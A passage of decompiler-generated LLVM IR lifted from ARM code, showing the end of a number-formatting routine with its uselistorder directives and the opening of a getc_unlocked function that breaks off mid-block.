  %v7_f7f0 = icmp eq i32 %v0_f7f0, 102
  store i1 %v7_f7f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7f0, label %dec_label_pc_f878, label %dec_label_pc_f7f8

dec_label_pc_f7f8:                                ; preds = %dec_label_pc_f7f0
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_f7fc = load i32, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f7fc = icmp slt i32 %v0_f7fc, 0
  store i1 %v1_f7fc, i1* %cpsr_n.global-to-local, align 1
  %v2_f7fc = icmp eq i32 %v0_f7fc, 0
  store i1 %v2_f7fc, i1* %cpsr_z.global-to-local, align 1
  %v4_f800 = zext i8 %stack_var_-66.0108114 to i32
  store i32 %v4_f800, i32* %r8.global-to-local, align 4
  store i32 0, i32* %stack_var_-51, align 4
  %v4_f810 = sub i32 0, %v0_f7fc
  %storemerge140 = select i1 %v1_f7fc, i32 %v4_f810, i32 %v0_f7fc
  %tmp239 = ashr i32 %v0_f7fc, 31
  %tmp240 = and i32 %tmp239, 2
  %tmp241 = add nuw nsw i32 %tmp240, 43
  store i32 %storemerge140, i32* %r4.global-to-local, align 4
  store i32 %tmp241, i32* %sl.global-to-local, align 4
  %v2_f818 = ptrtoint i32* %stack_var_-51 to i32
  store i32 %v2_f818, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f820

dec_label_pc_f820:                                ; preds = %dec_label_pc_f850, %dec_label_pc_f820, %dec_label_pc_f7f8
  %v2_f838 = phi i32 [ %v2_f818, %dec_label_pc_f7f8 ], [ %v6_f838, %dec_label_pc_f820 ], [ %v6_f838, %dec_label_pc_f850 ]
  %v0_f834 = phi i32 [ %storemerge140, %dec_label_pc_f7f8 ], [ %v2_f83c, %dec_label_pc_f820 ], [ %v2_f83c, %dec_label_pc_f850 ]
  %v2_f828 = srem i32 %v0_f834, 10
  %v1_f82c = add nsw i32 %v2_f828, 48
  store i32 %v1_f82c, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v0_f834, i32* %r0.global-to-local, align 4
  %v1_f838 = trunc i32 %v1_f82c to i8
  %v3_f838 = add i32 %v2_f838, -1
  %v4_f838 = inttoptr i32 %v3_f838 to i8*
  store i8 %v1_f838, i8* %v4_f838, align 1
  %v5_f838 = load i32, i32* %r5.global-to-local, align 4
  %v6_f838 = add i32 %v5_f838, -1
  store i32 %v6_f838, i32* %r5.global-to-local, align 4
  %v0_f83c = load i32, i32* %r0.global-to-local, align 4
  %v1_f83c = load i32, i32* %r1.global-to-local, align 4
  %v2_f83c = sdiv i32 %v0_f83c, %v1_f83c
  store i32 %v2_f83c, i32* %r0.global-to-local, align 4
  %v0_f840 = load i32, i32* %r7.global-to-local, align 4
  %v1_f840 = add i32 %v0_f840, 1
  store i32 %v1_f840, i32* %r7.global-to-local, align 4
  %v1_f844 = add i32 %v0_f840, -2
  %v3_f844 = sub i32 1, %v0_f840
  %v4_f844 = and i32 %v3_f844, %v1_f840
  %v5_f844 = icmp slt i32 %v4_f844, 0
  store i1 %v5_f844, i1* %cpsr_v.global-to-local, align 1
  %v6_f844 = icmp slt i32 %v1_f844, 0
  store i1 %v6_f844, i1* %cpsr_n.global-to-local, align 1
  %v7_f844 = icmp eq i32 %v1_f840, 3
  store i1 %v7_f844, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_f83c, i32* %r4.global-to-local, align 4
  %v7_f84c = icmp slt i32 %v1_f840, 4
  br i1 %v7_f84c, label %dec_label_pc_f820, label %dec_label_pc_f850

dec_label_pc_f850:                                ; preds = %dec_label_pc_f820
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f850 = icmp slt i32 %v2_f83c, 0
  store i1 %v1_f850, i1* %cpsr_n.global-to-local, align 1
  %v2_f850 = icmp eq i32 %v2_f83c, 0
  store i1 %v2_f850, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f850, label %dec_label_pc_f858, label %dec_label_pc_f820

dec_label_pc_f858:                                ; preds = %dec_label_pc_f850
  %v1_f858 = add i32 %v5_f838, -2
  store i32 %v1_f858, i32* %r3.global-to-local, align 4
  %v0_f85c = load i32, i32* %sl.global-to-local, align 4
  %v1_f85c = trunc i32 %v0_f85c to i8
  %v4_f85c = inttoptr i32 %v1_f858 to i8*
  store i8 %v1_f85c, i8* %v4_f85c, align 1
  %v0_f860 = load i32, i32* %r3.global-to-local, align 4
  %v1_f860 = add i32 %v0_f860, -1
  store i32 %v1_f860, i32* %r2.global-to-local, align 4
  %v0_f864 = load i32, i32* %r8.global-to-local, align 4
  %v1_f864 = trunc i32 %v0_f864 to i8
  %v4_f864 = inttoptr i32 %v1_f860 to i8*
  store i8 %v1_f864, i8* %v4_f864, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_f86c = load i32, i32* %r6.global-to-local, align 4
  %v1_f86c = inttoptr i32 %v0_f86c to i32*
  store i32 112, i32* %v1_f86c, align 4
  %v3_f86c = add i32 %v0_f86c, 4
  %v4_f86c = inttoptr i32 %v3_f86c to i32*
  %v5_f86c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_f86c, i32* %v4_f86c, align 4
  %v0_f870 = load i32, i32* %r2.global-to-local, align 4
  %v1_f870 = load i32, i32* %r6.global-to-local, align 4
  %v2_f870 = add i32 %v1_f870, 8
  %v3_f870 = inttoptr i32 %v2_f870 to i32*
  store i32 %v0_f870, i32* %v3_f870, align 4
  %v0_f874 = load i32, i32* %r6.global-to-local, align 4
  %v1_f874 = add i32 %v0_f874, 12
  store i32 %v1_f874, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f878

dec_label_pc_f878:                                ; preds = %dec_label_pc_f7f0, %.thread105, %dec_label_pc_f858
  %v1_f884.pre = phi i32 [ %v2_f3f0, %.thread105 ], [ %v1_f874, %dec_label_pc_f858 ], [ %v1_f884.pre.pre, %dec_label_pc_f7f0 ]
  %v2_f878 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_f878, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f87c

dec_label_pc_f87c:                                ; preds = %dec_label_pc_f87c, %dec_label_pc_f878
  %v0_f87c = phi i32 [ %v2_f878, %dec_label_pc_f878 ], [ %v4_f87c, %dec_label_pc_f87c ]
  %stack_var_-188.0 = phi i32 [ %v3_f328, %dec_label_pc_f878 ], [ %v2_f888, %dec_label_pc_f87c ]
  %v1_f87c = inttoptr i32 %v0_f87c to i32*
  %v2_f87c = load i32, i32* %v1_f87c, align 4
  store i32 %v2_f87c, i32* %r3.global-to-local, align 4
  %v4_f87c = add i32 %v0_f87c, 12
  store i32 %v4_f87c, i32* %r2.global-to-local, align 4
  %v3_f884 = icmp ult i32 %v4_f87c, %v1_f884.pre
  %v2_f888 = sub i32 %stack_var_-188.0, %v2_f87c
  store i32 %v2_f888, i32* %ip.global-to-local, align 4
  br i1 %v3_f884, label %dec_label_pc_f87c, label %dec_label_pc_f894

dec_label_pc_f894:                                ; preds = %dec_label_pc_f87c
  %v3_f894 = load i8, i8* %stack_var_-50, align 1
  %v4_f894 = sext i8 %v3_f894 to i32
  store i32 %v4_f894, i32* %r3.global-to-local, align 4
  store i32 %v4_f894, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f898 = icmp slt i8 %v3_f894, 0
  store i1 %v1_f898, i1* %cpsr_n.global-to-local, align 1
  %v2_f898 = icmp eq i8 %v3_f894, 0
  store i1 %v2_f898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f898, label %bb226, label %bb225

bb225:                                            ; preds = %dec_label_pc_f894
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %dec_label_pc_f894, %bb225
  %v1_f8e4 = phi i32 [ %v4_f894, %dec_label_pc_f894 ], [ 1, %bb225 ]
  %v2_f8a0 = sub i32 %v2_f888, %v1_f8e4
  store i32 %v2_f8a0, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_f8a8 = ptrtoint i8* %stack_var_-50 to i32
  store i32 %v2_f8a8, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f8ac = icmp slt i32 %v2_f8a0, 0
  store i1 %v1_f8ac, i1* %cpsr_n.global-to-local, align 1
  %v2_f8ac = icmp eq i32 %v2_f8a0, 0
  store i1 %v2_f8ac, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-184, align 4
  %tmp227 = icmp slt i32 %v2_f8a0, 1
  br i1 %tmp227, label %dec_label_pc_f90c, label %dec_label_pc_f8c0

dec_label_pc_f8c0:                                ; preds = %bb226
  %v0_f8c0 = load i32, i32* %fp.global-to-local, align 4
  %v1_f8c0 = add i32 %v0_f8c0, 12
  %v2_f8c0 = inttoptr i32 %v1_f8c0 to i32*
  %v3_f8c0 = load i32, i32* %v2_f8c0, align 4
  store i32 %v3_f8c0, i32* %r3.global-to-local, align 4
  %v1_f8c4 = and i32 %v3_f8c0, 8
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_f8c4 = icmp eq i32 %v1_f8c4, 0
  store i1 %v2_f8c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f8c4, label %dec_label_pc_f8dc, label %dec_label_pc_f8cc

dec_label_pc_f8cc:                                ; preds = %dec_label_pc_f8c0
  store i32 ptrtoint (i32* @global_var_1496f.668 to i32), i32* %r3.global-to-local, align 4
  %v1_f8d0 = add i32 %v1_f884.pre, 12
  store i32 %v1_f8d0, i32* %r5.global-to-local, align 4
  %v1_f8d4 = inttoptr i32 %v1_f884.pre to i32*
  store i32 160, i32* %v1_f8d4, align 4
  %v3_f8d4 = add i32 %v1_f884.pre, 4
  %v4_f8d4 = inttoptr i32 %v3_f8d4 to i32*
  %v5_f8d4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_f8d4, i32* %v4_f8d4, align 4
  %v6_f8d4 = add i32 %v1_f884.pre, 8
  %v7_f8d4 = inttoptr i32 %v6_f8d4 to i32*
  %v8_f8d4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_f8d4, i32* %v7_f8d4, align 4
  br label %dec_label_pc_f910

dec_label_pc_f8dc:                                ; preds = %dec_label_pc_f8c0
  %v1_f8dc = add i32 %v0_f8c0, 16
  %v2_f8dc = inttoptr i32 %v1_f8dc to i32*
  %v3_f8dc = load i32, i32* %v2_f8dc, align 4
  store i32 %v3_f8dc, i32* %r3.global-to-local, align 4
  %v1_f8e0 = add i32 %v3_f8dc, -48
  %v3_f8e0 = sub i32 47, %v3_f8dc
  %v4_f8e0 = and i32 %v3_f8e0, %v3_f8dc
  %v5_f8e0 = icmp slt i32 %v4_f8e0, 0
  store i1 %v5_f8e0, i1* %cpsr_v.global-to-local, align 1
  %v6_f8e0 = icmp slt i32 %v1_f8e0, 0
  store i1 %v6_f8e0, i1* %cpsr_n.global-to-local, align 1
  %v7_f8e0 = icmp eq i32 %v3_f8dc, 48
  store i1 %v7_f8e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8e0, label %dec_label_pc_f8f0, label %bb228

bb228:                                            ; preds = %dec_label_pc_f8dc
  store i32 %v2_f888, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f90c

dec_label_pc_f8f0:                                ; preds = %dec_label_pc_f8dc
  %v3_f8f0 = load i32, i32* %stack_var_-168, align 4
  store i32 %v1_f884.pre, i32* %r5.global-to-local, align 4
  %v2_f8f8 = add i32 %v3_f8f0, %v2_f8a0
  store i32 %v2_f8f8, i32* %r3.global-to-local, align 4
  store i32 %v2_f8f8, i32* %stack_var_-168, align 4
  br label %dec_label_pc_f910

dec_label_pc_f904:                                ; preds = %dec_label_pc_f918
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f948

dec_label_pc_f90c:                                ; preds = %bb228, %bb226
  store i32 %v1_f884.pre, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_f910

dec_label_pc_f910:                                ; preds = %dec_label_pc_f8f0, %dec_label_pc_f8cc, %dec_label_pc_f90c
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_f304, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f918

dec_label_pc_f918:                                ; preds = %dec_label_pc_f940, %dec_label_pc_f910
  %v0_f918 = phi i32 [ %v1_f938, %dec_label_pc_f940 ], [ %v2_f304, %dec_label_pc_f910 ]
  %v1_f918 = inttoptr i32 %v0_f918 to i32*
  %v2_f918 = load i32, i32* %v1_f918, align 4
  store i32 %v2_f918, i32* %r1.global-to-local, align 4
  %v3_f918 = add i32 %v0_f918, 4
  %v4_f918 = inttoptr i32 %v3_f918 to i32*
  %v5_f918 = load i32, i32* %v4_f918, align 4
  store i32 %v5_f918, i32* %r2.global-to-local, align 4
  %v6_f918 = add i32 %v0_f918, 8
  %v7_f918 = inttoptr i32 %v6_f918 to i32*
  %v8_f918 = load i32, i32* %v7_f918, align 4
  store i32 %v8_f918, i32* %r3.global-to-local, align 4
  %v2_f91c = load i32, i32* %stack_var_-192, align 4
  store i32 %v2_f91c, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* @ip, align 4
  store i32 63788, i32* @lr, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_f92c = load i32, i32* %r4.global-to-local, align 4
  %v1_f92c = add i32 %v0_f92c, 4
  %v2_f92c = inttoptr i32 %v1_f92c to i32*
  %v3_f92c = load i32, i32* %v2_f92c, align 4
  store i32 %v3_f92c, i32* %r3.global-to-local, align 4
  %v0_f930 = load i32, i32* %r0.global-to-local, align 4
  %v2_f930 = sub i32 %v0_f930, %v3_f92c
  %v4_f930 = xor i32 %v0_f930, %v3_f92c
  %v5_f930 = xor i32 %v2_f930, %v0_f930
  %v6_f930 = and i32 %v5_f930, %v4_f930
  %v7_f930 = icmp slt i32 %v6_f930, 0
  store i1 %v7_f930, i1* %cpsr_v.global-to-local, align 1
  %v8_f930 = icmp slt i32 %v2_f930, 0
  store i1 %v8_f930, i1* %cpsr_n.global-to-local, align 1
  %v9_f930 = icmp eq i32 %v0_f930, %v3_f92c
  store i1 %v9_f930, i1* %cpsr_z.global-to-local, align 1
  %v0_f934 = load i32, i32* %r6.global-to-local, align 4
  %v2_f934 = add i32 %v0_f934, %v0_f930
  store i32 %v2_f934, i32* %r6.global-to-local, align 4
  %v1_f938 = add i32 %v0_f92c, 12
  store i32 %v1_f938, i32* %r4.global-to-local, align 4
  br i1 %v9_f930, label %dec_label_pc_f940, label %dec_label_pc_f904

dec_label_pc_f940:                                ; preds = %dec_label_pc_f918
  %v1_f940 = load i32, i32* %r5.global-to-local, align 4
  %v2_f940 = sub i32 %v1_f938, %v1_f940
  %v3_f940 = icmp ult i32 %v1_f938, %v1_f940
  %v4_f940 = xor i32 %v1_f940, %v1_f938
  %v5_f940 = xor i32 %v2_f940, %v1_f938
  %v6_f940 = and i32 %v5_f940, %v4_f940
  %v7_f940 = icmp slt i32 %v6_f940, 0
  store i1 %v7_f940, i1* %cpsr_v.global-to-local, align 1
  %v8_f940 = icmp slt i32 %v2_f940, 0
  store i1 %v8_f940, i1* %cpsr_n.global-to-local, align 1
  %v9_f940 = icmp eq i32 %v1_f938, %v1_f940
  store i1 %v9_f940, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f940, label %dec_label_pc_f918, label %dec_label_pc_f948

dec_label_pc_f948:                                ; preds = %dec_label_pc_f940, %dec_label_pc_f904
  %v0_f948 = phi i32 [ -1, %dec_label_pc_f904 ], [ %v2_f934, %dec_label_pc_f940 ]
  store i32 %v0_f948, i32* %r0.global-to-local, align 4
  %v8_f954 = load i32, i32* %stack_var_-36, align 4
  store i32 %v8_f954, i32* @r6, align 4
  store i32 %v6_f2f0, i32* @r7, align 4
  store i32 %v9_f2f0, i32* @r8, align 4
  store i32 %v12_f2f0, i32* @sb, align 4
  store i32 %v15_f2f0, i32* @sl, align 4
  store i32 %v18_f2f0, i32* @fp, align 4
  ret i32 %v0_f948

; uselistorder directives
  uselistorder i32 %v0_f948, { 1, 0 }
  uselistorder i32 %v2_f940, { 1, 0 }
  uselistorder i32 %v1_f940, { 2, 0, 1, 3 }
  uselistorder i32 %v1_f938, { 4, 0, 1, 5, 3, 6, 2 }
  uselistorder i32 %v2_f930, { 1, 0 }
  uselistorder i32 %v0_f930, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v3_f92c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_f918, { 2, 1, 0 }
  uselistorder i32 %v3_f8dc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_f888, { 0, 1, 3, 2 }
  uselistorder i32 %v4_f87c, { 1, 2, 0 }
  uselistorder i32 %v0_f87c, { 1, 0 }
  uselistorder i32 %v1_f884.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_f83c, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v6_f838, { 2, 1, 0 }
  uselistorder i32 %storemerge140, { 1, 0 }
  uselistorder i32 %v0_f7fc, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_f7f0, { 3, 0, 1, 2 }
  uselistorder i32 %v2_f7cc, { 1, 0 }
  uselistorder i32 %v1_f7cc, { 1, 2, 0, 3 }
  uselistorder i32 %v2_f7c8, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v0_f7c0, { 1, 0 }
  uselistorder i32 %v0_f7b8, { 3, 0, 1, 2 }
  uselistorder i32 %v0_f7a0, { 1, 0 }
  uselistorder i32 %v1_f77c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_f77c, { 1, 0, 2 }
  uselistorder i32 %v1_f758, { 0, 2, 1 }
  uselistorder i32 %v0_f754, { 3, 0, 1, 2 }
  uselistorder i1 %v2_f738, { 2, 1, 0 }
  uselistorder i32 %v2_f690, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_f680, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder i32 %v0_f724, { 3, 0, 4, 7, 5, 6, 9, 1, 2, 8 }
  uselistorder i32 %v0_f62c, { 1, 4, 0, 2, 3 }
  uselistorder i1 %v2_f614, { 1, 0 }
  uselistorder i32 %v2_f60c, { 1, 2, 0 }
  uselistorder i32 %v1_f600, { 1, 0 }
  uselistorder i32 %v0_f600, { 2, 3, 5, 0, 4, 1 }
  uselistorder i32 %v1_f5f8, { 1, 0, 2 }
  uselistorder i32 %v0_f5f0, { 3, 0, 1, 2 }
  uselistorder i1 %v3_f5d4, { 1, 0 }
  uselistorder i32 %v2_f5d4, { 1, 0 }
  uselistorder i32 %v2_f5d0, { 2, 1, 3, 4, 6, 0, 7, 5, 8 }
  uselistorder i1 %v7_f5bc, { 1, 0 }
  uselistorder i32 %v1_f5c0, { 2, 1, 0 }
  uselistorder i1 %v2_f5b0, { 1, 0 }
  uselistorder i32 %v0_f5ac, { 2, 4, 0, 1, 5, 3, 7, 6 }
  uselistorder i1 %v2_f594, { 1, 0 }
  uselistorder i32 %v1_f588, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v2_f540, { 1, 2, 0 }
  uselistorder i32 %v2_f53c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_f53c, { 1, 0, 2 }
  uselistorder i1 %v2_f528, { 1, 0 }
  uselistorder i32 %v0_f520, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_f530, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_f510, { 1, 0 }
  uselistorder i32 %v0_f500, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i1 %v6_f4f8, { 1, 0 }
  uselistorder i1 %v5_f4f8, { 1, 0 }
  uselistorder i32 %v0_f4f4, { 0, 2, 1, 3 }
  uselistorder i32 %v0_f4e8, { 2, 5, 0, 3, 4, 1 }
  uselistorder i32 %v2_f4e4, { 0, 1, 3, 5, 2, 4 }
  uselistorder i32 %v4_f498, { 1, 0 }
  uselistorder i32 %v3_f498, { 1, 0 }
  uselistorder i32 %v0_f3cc, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v2_f304, { 0, 1, 3, 2 }
  uselistorder i32 %v1_f300, { 1, 0 }
  uselistorder i32* %stack_var_-87, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-86, { 1, 2, 0 }
  uselistorder i32* %stack_var_-51, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-50, { 1, 3, 0, 2 }
  uselistorder i32 %tmp, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 1, 2, 4, 3, 5, 0, 6, 7, 8, 9 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 6, 2, 3, 7, 8, 4 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 7, 8, 9, 6, 10, 4, 11, 12, 13, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0, 4, 11, 12, 13, 5, 14, 15, 16, 6, 17, 18, 19, 7, 20, 21, 22, 8, 23, 24, 25, 9, 10, 26, 27, 28, 29, 30 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 18, 19, 21, 22, 23, 24, 25, 26, 44, 27, 28, 32, 29, 30, 31, 33, 48, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 1, 45, 49, 2, 50, 51, 52, 53, 46, 47, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 15, 16, 12, 13, 17, 18, 19, 20, 22, 23, 21, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 10, 11, 6, 7, 8, 12, 13, 14, 16, 15, 17, 18, 19, 20, 21, 23, 24, 22, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 1, 7, 8, 16, 18, 15, 17, 9, 10, 19, 11, 12, 13, 20, 14, 0, 21, 22, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 6, 3, 4, 5, 7, 10, 8, 9, 11 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 27, 28, 29, 1, 30, 31, 32, 33, 34, 0, 35, 36, 37, 38, 39, 40, 41, 2, 42, 44, 45, 46, 47, 48, 49, 50, 51, 43 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 26, 27, 28, 29, 0, 30, 31, 32, 33, 1, 34, 35, 36, 37, 38, 39, 40, 2, 41, 43, 44, 45, 46, 47, 48, 42 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0, 31, 32, 33, 34, 2, 35, 36, 37, 38, 39, 40, 41, 1, 42, 44, 45, 46, 47, 48, 49, 50, 51, 43 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 112, { 2, 4, 0, 5, 3, 1, 6 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 17, { 8, 1, 10, 2, 11, 3, 12, 0, 13, 4, 14, 5, 15, 6, 16, 7, 17, 18, 9 }
  uselistorder i32 102, { 3, 0, 1, 4, 5, 2, 6 }
  uselistorder i32 96, { 1, 2, 0 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder label %dec_label_pc_f910, { 2, 0, 1 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %dec_label_pc_f878, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f7f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f7c8, { 1, 0 }
  uselistorder label %.thread42, { 1, 0 }
  uselistorder label %dec_label_pc_f7a0, { 1, 0 }
  uselistorder label %dec_label_pc_f77c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f760, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f734, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f730, { 0, 2, 1 }
  uselistorder label %dec_label_pc_f654, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %dec_label_pc_f644, { 1, 0 }
  uselistorder label %dec_label_pc_f638, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb202, { 1, 0 }
  uselistorder label %bb200, { 1, 0 }
  uselistorder label %.preheader, { 3, 2, 1, 0 }
  uselistorder label %bb197, { 1, 0 }
  uselistorder label %dec_label_pc_f560, { 2, 0, 1 }
  uselistorder label %bb194, { 2, 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb187, { 1, 0 }
  uselistorder label %.thread105, { 1, 0 }
  uselistorder label %bb184, { 1, 0 }
  uselistorder label %bb182, { 1, 0 }
  uselistorder label %bb180, { 1, 0 }
}

define i32 @getc_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_f958 = load i32, i32* @r4, align 4
  store i32 %v3_f958, i32* %stack_var_-8, align 4
  %v0_f95c = load i32, i32* @r0, align 4
  %v1_f95c = add i32 %v0_f95c, 16
  %v2_f95c = inttoptr i32 %v1_f95c to i32*
  %v3_f95c = load i32, i32* %v2_f95c, align 4
  store i32 %v3_f95c, i32* %r2.global-to-local, align 4
  %v1_f960 = add i32 %v0_f95c, 24
  %v2_f960 = inttoptr i32 %v1_f960 to i32*
  %v3_f960 = load i32, i32* %v2_f960, align 4
  %v3_f964 = icmp ult i32 %v3_f95c, %v3_f960
  store i32 %v0_f95c, i32* @r4, align 4
  br i1 %v3_f964, label %bb, label %dec_label_pc_f97c

bb:                                               ; preds = %entry
  %v2_f96c = inttoptr i32 %v3_f95c to i8*
  %v3_f96c = load i8, i8* %v2_f96c, align 1
  %v4_f96c = zext i8 %v3_f96c to i32
  store i32 %v4_f96c, i32* %r0.global-to-local, align 4
  %v6_f96c = add i32 %v3_f95c, 1
  store i32 %v6_f96c, i32* %r2.global-to-local, align 4
  store i32 %v6_f96c, i32* %v2_f95c, align 4
  br label %dec_label_pc_fa7c

dec_label_pc_f97c:                                ; preds = %entry
  %v1_f97c = inttoptr i32 %v0_f95c to i8*
  %v2_f97c = load i8, i8* %v1_f97c, align 1
  %v3_f97c = zext i8 %v2_f97c to i32
  %v1_f980 = and i32 %v3_f97c, 131
  %tmp22 = icmp ugt i32 %v1_f980, 128
  br i1 %tmp22, label %dec_label_pc_f99c, label %dec_label_pc_f98c

dec_label_pc_f98c:                                ; preds = %dec_label_pc_f97c
  store i32 128, i32* @r1, align 4
  %v0_f990 = call i32 @__stdio_trans2r_o()
  store i32 %v0_f990, i32* %r0.global-to-local, align 4
  %v2_f994 = icmp eq i32 %v0_f990, 0
  br i1 %v2_f994, label %dec_label_pc_f98c.dec_label_pc_f99c_crit_edge, label %dec_label_pc_fa78

dec_label_pc_f98c.dec_label_pc_f99c_crit_edge:    ; preds = %dec_label_pc_f98c
  %v0_f99c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_f99c

dec_label_pc_f99c:                                ; preds = %dec_label_pc_f98c.dec_label_pc_f99c_crit_edge, %dec_label_pc_f97c
  %v2_f9e8 = phi i32 [ %v0_f99c.pre, %dec_label_pc_f98c.dec_label_pc_f99c_crit_edge ], [ %v0_f95c, %dec_label_pc_f97c ]
  %v1_f99c = inttoptr i32 %v2_f9e8 to i8*
  %v2_f99c = load i8, i8* %v1_f99c, align 1
  %v3_f99c = zext i8 %v2_f99c to i32
  store i32 %v3_f99c, i32* %r2.global-to-local, align 4
  %v1_f9a0 = add i32 %v2_f9e8, 1
  %v2_f9a0 = inttoptr i32 %v1_f9a0 to i8*
  %v3_f9a0 = load i8, i8* %v2_f9a0, align 1
  %v4_f9a0 = zext i8 %v3_f9a0 to i32
  %v4_f9a4 = mul nuw nsw i32 %v4_f9a0, 256
  %v5_f9a4 = or i32 %v4_f9a4, %v3_f99c
  store i32 %v5_f9a4, i32* %r2.global-to-local, align 4
  %v1_f9a8 = and i32 %v3_f99c, 2
  %v2_f9a8 = icmp eq i32 %v1_f9a8, 0
  br i1 %v2_f9a8, label %dec_label_pc_f9d8, label %dec_label_pc_f9b0

dec_label_pc_f9b0:                                ; preds = %dec_label_pc_f99c
  %tmp23 = urem i8 %v2_f99c, 2
  %v1_f9b0 = zext i8 %tmp23 to i32
  %tmp18 = sub nsw i32 0, %v1_f9b0
  %v4_f9b4 = and i32 %tmp18, 4
  %v5_f9b4 = add i32 %v4_f9b4, %v2_f9e8
  %v1_f9b8 = add i32 %v5_f9b4, 36
